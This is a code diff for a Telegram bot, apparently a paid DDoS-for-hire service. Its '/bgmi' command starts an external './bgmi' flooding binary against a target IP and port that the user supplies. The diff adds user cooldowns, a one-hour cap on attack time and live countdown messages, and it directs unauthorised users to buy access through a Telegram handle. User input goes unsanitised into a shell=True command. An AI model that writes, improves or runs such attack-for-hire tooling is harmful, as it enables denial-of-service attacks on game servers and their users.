@@ -339,14 +339,22 @@ def handle_bgmi(message):
     bot.reply_to(message, response)
 
 
-  # To run the countdown without blocking the bot
-
-@bot.message_handler(commands=['bgmi'])
+# Function to handle the /bgmi command with cooldown and non-blocking execution
 def handle_bgmi(message):
-    user_id = message.from_user.id
-    allowed_user_ids = read_users()
-    
+    user_id = str(message.chat.id)
+    allowed_user_ids = read_users()  # Make sure you have defined read_users()
+
     if user_id in allowed_user_ids:
+        # Check if the user is an admin (admins have no cooldown)
+        if user_id not in admin_id:
+            # Check if the user has run the command recently and is within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                response = f"You Are On Cooldown ❌. Please Wait {COOLDOWN_TIME} seconds Before Running The /bgmi Command Again."
+                bot.reply_to(message, response)
+                return
+            # Update the last time the user ran the command
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+
         # Parse the command for target, port, and time
         command_args = message.text.split()[1:]
         if len(command_args) != 3:
@@ -356,26 +364,54 @@ def handle_bgmi(message):
         target, port, time_to_attack = command_args
         try:
             time_to_attack = int(time_to_attack)
+            port = int(port)
         except ValueError:
-            bot.reply_to(message, "Time must be a number.")
+            bot.reply_to(message, "Port and time must be numbers.")
             return
-        
-        bot.reply_to(message, f"BGMI Attack started on Target: {target}, Port: {port}, Time: {time_to_attack} seconds.")
 
-        # Start the attack in a subprocess
+        if time_to_attack > 3600:  # Set max time to 1 hour (3600 seconds) to prevent overly long attacks
+            bot.reply_to(message, "Error: Time interval must be less than 3600 seconds (1 hour).")
+            return
+
+        # Send initial message
+        message_reply = bot.reply_to(message, f"BGMI Attack started on Target: {target}, Port: {port}, Time: {time_to_attack} seconds.")
+
+        # Start the attack in a subprocess (non-blocking)
         full_command = f"./bgmi {target} {port} {time_to_attack} 110"
-        subprocess.Popen(full_command, shell=True)  # Non-blocking call so we can handle countdown
+        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-        # Start countdown in a separate thread to avoid blocking the bot
-        def countdown_timer():
-            for remaining_time in range(time_to_attack, 0, -1):
-                time.sleep(1)  # Wait for 1 second
-                bot.send_message(user_id, f"⏳ {remaining_time} seconds remaining for the BGMI attack on {target}.")
-            
-            bot.send_message(user_id, "✅ BGMI Attack finished successfully.")
-        
-        # Run the countdown in a separate thread
-        threading.Thread(target=countdown_timer).start()
+        # Start the countdown timer in a separate thread to update the user
+        threading.Thread(target=countdown_timer, args=(message_reply, target, time_to_attack)).start()
+
+        # Optionally monitor the output (if needed)
+        threading.Thread(target=monitor_attack_output, args=(process,)).start()
+
+    else:
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @venomXcrazy")
+        bot.reply_to(message, response)
+
+# Countdown timer to update the message with remaining time
+def countdown_timer(message_reply, target, time_to_attack):
+    chat_id = message_reply.chat.id
+    message_id = message_reply.message_id
+    for remaining_time in range(time_to_attack, 0, -1):
+        # Edit the same message with the updated countdown
+        try:
+            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=f"⏳ {remaining_time} seconds remaining for the BGMI attack on {target}.")
+        except Exception as e:
+            print(f"Error editing message: {e}")
+        time.sleep(1)  # Wait for 1 second
+
+    # After the countdown is done, update the message to indicate completion
+    bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="✅ BGMI Attack finished successfully.")
+
+# Function to monitor the attack process output
+def monitor_attack_output(process):
+    for line in process.stdout:
+        print(line.decode('utf-8'))  # Output the real-time logs of the attack command
+    for err in process.stderr:
+        print(err.decode('utf-8'))  # Output error logs if there are any
+
 
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
